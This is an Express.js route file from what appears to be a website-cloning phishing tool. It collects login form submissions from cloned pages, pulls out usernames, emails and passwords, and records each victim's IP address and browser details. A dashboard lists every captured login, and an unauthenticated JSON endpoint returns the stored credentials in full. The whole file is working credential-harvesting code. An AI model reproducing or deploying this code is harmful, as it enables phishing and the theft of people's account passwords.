const express = require('express');
const router = express.Router();
const credentialService = require('../services/credentialService');

router.post('/login', (req, res) => {
  try {
    const formData = { ...req.body };
    const sourceInfo = {
      userAgent: req.get('User-Agent'),
      referer: req.get('Referer') || req.get('Referrer'),
      ip: req.ip || req.connection.remoteAddress,
      contentType: req.get('Content-Type')
    };
    const credentials = extractCredentials(formData);
    const captured = credentialService.addCredential({
      formData,
      credentials,
      source: sourceInfo,
      rawBody: JSON.stringify(formData)
    });
    
    console.log('\n🔐 === LOGIN CAPTURED ===');
    console.log(`   ID: ${captured.id}`);
    console.log(`   Time: ${captured.timestamp}`);
    console.log(`   Fields:`, Object.keys(formData));
    if (credentials.username) console.log(`   Username: ${credentials.username}`);
    if (credentials.email) console.log(`   Email: ${credentials.email}`);
    if (credentials.password) console.log(`   Password: ${'•'.repeat(credentials.password.length)}`);
    console.log('   ========================\n');
    
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Login Captured</title>
        <style>
          *{margin:0;padding:0;box-sizing:border-box}
          body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
          .container{background:rgba(30,41,59,0.9);border:1px solid #334155;border-radius:1rem;padding:2rem;max-width:500px;width:100%;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5)}
          .icon{font-size:4rem;margin-bottom:1rem}
          h1{color:#10b981;margin-bottom:0.5rem;font-size:1.5rem}
          .subtitle{color:#94a3b8;margin-bottom:1.5rem}
          .data-box{background:rgba(15,23,42,0.8);border:1px solid #475569;border-radius:0.5rem;padding:1rem;text-align:left;margin-bottom:1.5rem}
          .data-box h3{color:#e2e8f0;margin-bottom:0.75rem;font-size:0.9rem}
          .data-row{display:flex;justify-content:space-between;padding:0.5rem 0;border-bottom:1px solid #334155}
          .data-row:last-child{border-bottom:none}
          .data-label{color:#94a3b8;font-size:0.85rem}
          .data-value{color:#10b981;font-family:monospace;font-size:0.85rem}
          .password-value{color:#f59e0b}
          .btn{display:inline-block;padding:0.75rem 1.5rem;background:linear-gradient(135deg,#10b981,#14b8a6);color:white;text-decoration:none;border-radius:0.5rem;font-weight:600;transition:transform 0.2s,box-shadow 0.2s;margin:0.25rem}
          .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(16,185,129,0.3)}
          .btn-secondary{background:#475569}
          .btn-secondary:hover{box-shadow:0 10px 30px rgba(71,85,105,0.3)}
          .id-badge{display:inline-block;background:rgba(16,185,129,0.2);color:#10b981;padding:0.25rem 0.75rem;border-radius:9999px;font-size:0.75rem;font-family:monospace;margin-bottom:1rem}
        </style>
      </head>
      <body>
        <div class="container">
          <div class="icon">🔐</div>
          <h1>Login Captured!</h1>
          <p class="subtitle">The credentials have been saved successfully</p>
          <div class="id-badge">ID: ${captured.id}</div>
          <div class="data-box">
            <h3>📋 Captured Data</h3>
            ${Object.entries(formData).map(([key, value]) => `
              <div class="data-row">
                <span class="data-label">${key}</span>
                <span class="data-value ${key.toLowerCase().includes('pass') ? 'password-value' : ''}">${
                  key.toLowerCase().includes('pass') ? '•'.repeat(String(value).length) : value
                }</span>
              </div>
            `).join('')}
          </div>
          <div>
            <a href="/" class="btn">🏠 Back to Cloner</a>
            <a href="/credentials" class="btn btn-secondary">📋 View All Credentials</a>
          </div>
        </div>
      </body>
      </html>
    `);
    
  } catch (error) {
    console.error('Login capture error:', error);
    res.status(500).send(`
      <html><head><title>Error</title></head>
      <body style="font-family:Arial;padding:50px;text-align:center;background:#1e293b;color:white;">
        <h1 style="color:#ef4444;">Error Capturing Login</h1>
        <p>${error.message}</p>
        <a href="/" style="color:#10b981;">← Back to Cloner</a>
      </body></html>
    `);
  }
});

router.get('/credentials', (req, res) => {
  const credentials = credentialService.getAllCredentials();
  const count = credentialService.getCount();
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Captured Credentials</title>
      <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);min-height:100vh;padding:2rem;color:#e2e8f0}
        .container{max-width:1200px;margin:0 auto}
        .header{text-align:center;margin-bottom:2rem}
        .header h1{font-size:2rem;color:white;margin-bottom:0.5rem}
        .header p{color:#94a3b8}
        .stats{display:flex;justify-content:center;gap:1rem;margin-bottom:2rem}
        .stat-box{background:rgba(30,41,59,0.5);border:1px solid #334155;border-radius:0.5rem;padding:1rem 2rem;text-align:center}
        .stat-value{font-size:2rem;font-weight:700;color:#10b981}
        .stat-label{font-size:0.85rem;color:#94a3b8}
        .actions{display:flex;justify-content:center;gap:1rem;margin-bottom:2rem}
        .btn{padding:0.75rem 1.5rem;border-radius:0.5rem;text-decoration:none;font-weight:600;transition:all 0.2s;border:none;cursor:pointer;font-size:1rem}
        .btn-primary{background:linear-gradient(135deg,#10b981,#14b8a6);color:white}
        .btn-danger{background:#ef4444;color:white}
        .btn-secondary{background:#475569;color:white}
        .btn:hover{transform:translateY(-2px)}
        .empty-state{text-align:center;padding:4rem 2rem;background:rgba(30,41,59,0.5);border:1px solid #334155;border-radius:1rem}
        .empty-icon{font-size:4rem;margin-bottom:1rem;opacity:0.5}
        .empty-text{color:#94a3b8}
        .credentials-list{display:flex;flex-direction:column;gap:1rem}
        .cred-card{background:rgba(30,41,59,0.5);border:1px solid #334155;border-radius:0.75rem;overflow:hidden}
        .cred-header{display:flex;justify-content:space-between;align-items:center;padding:1rem 1.5rem;background:rgba(15,23,42,0.5);border-bottom:1px solid #334155}
        .cred-id{font-family:monospace;color:#10b981;font-size:0.85rem}
        .cred-time{color:#94a3b8;font-size:0.85rem}
        .cred-body{padding:1rem 1.5rem}
        .cred-row{display:flex;justify-content:space-between;padding:0.5rem 0;border-bottom:1px solid rgba(51,65,85,0.5)}
        .cred-row:last-child{border-bottom:none}
        .cred-label{color:#94a3b8}
        .cred-value{font-family:monospace;color:#10b981;max-width:300px;overflow:hidden;text-overflow:ellipsis}
        .cred-value.password{color:#f59e0b}
        .cred-actions{padding:0.75rem 1.5rem;background:rgba(15,23,42,0.5);border-top:1px solid #334155;display:flex;justify-content:flex-end}
        .btn-small{padding:0.5rem 1rem;font-size:0.85rem}
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>🔐 Captured Credentials</h1>
          <p>All login attempts captured through cloned pages</p>
        </div>
        <div class="stats">
          <div class="stat-box">
            <div class="stat-value">${count}</div>
            <div class="stat-label">Total Captured</div>
          </div>
        </div>
        <div class="actions">
          <a href="/" class="btn btn-primary">🏠 Back to Cloner</a>
          ${count > 0 ? '<a href="/credentials/clear" class="btn btn-danger" onclick="return confirm(\'Clear all credentials?\')">🗑️ Clear All</a>' : ''}
        </div>
        ${count === 0 ? `
          <div class="empty-state">
            <div class="empty-icon">📭</div>
            <p class="empty-text">No credentials captured yet</p>
            <p class="empty-text" style="margin-top:0.5rem;font-size:0.9rem">Clone a site and test the login to capture credentials</p>
          </div>
        ` : `
          <div class="credentials-list">
            ${credentials.map(cred => `
              <div class="cred-card">
                <div class="cred-header">
                  <span class="cred-id">#${cred.id}</span>
                  <span class="cred-time">${new Date(cred.timestamp).toLocaleString()}</span>
                </div>
                <div class="cred-body">
                  ${Object.entries(cred.formData).map(([key, value]) => `
                    <div class="cred-row">
                      <span class="cred-label">${key}</span>
                      <span class="cred-value ${key.toLowerCase().includes('pass') ? 'password' : ''}">${
                        key.toLowerCase().includes('pass') ? '•'.repeat(String(value).length) : value
                      }</span>
                    </div>
                  `).join('')}
                </div>
                <div class="cred-actions">
                  <a href="/credentials/delete/${cred.id}" class="btn btn-secondary btn-small" onclick="return confirm('Delete this credential?')">🗑️ Delete</a>
                </div>
              </div>
            `).join('')}
          </div>
        `}
      </div>
    </body>
    </html>
  `);
});

router.get('/credentials/clear', (req, res) => {
  credentialService.clearAll();
  res.redirect('/credentials');
});

router.get('/credentials/delete/:id', (req, res) => {
  credentialService.deleteById(req.params.id);
  res.redirect('/credentials');
});

router.get('/api/credentials', (req, res) => {
  res.json({
    success: true,
    count: credentialService.getCount(),
    credentials: credentialService.getAllCredentials()
  });
});

function extractCredentials(formData) {
  const result = { username: null, email: null, password: null };
  for (const [key, value] of Object.entries(formData)) {
    const keyLower = key.toLowerCase();
    if (keyLower.includes('pass')) {
      result.password = value;
    } else if (keyLower.includes('email') || keyLower.includes('mail') || (typeof value === 'string' && value.includes('@'))) {
      result.email = value;
    } else if (keyLower.includes('user') || keyLower.includes('login') || keyLower.includes('name')) {
      if (!result.username) result.username = value;
    }
  }
  return result;
}

module.exports = router;
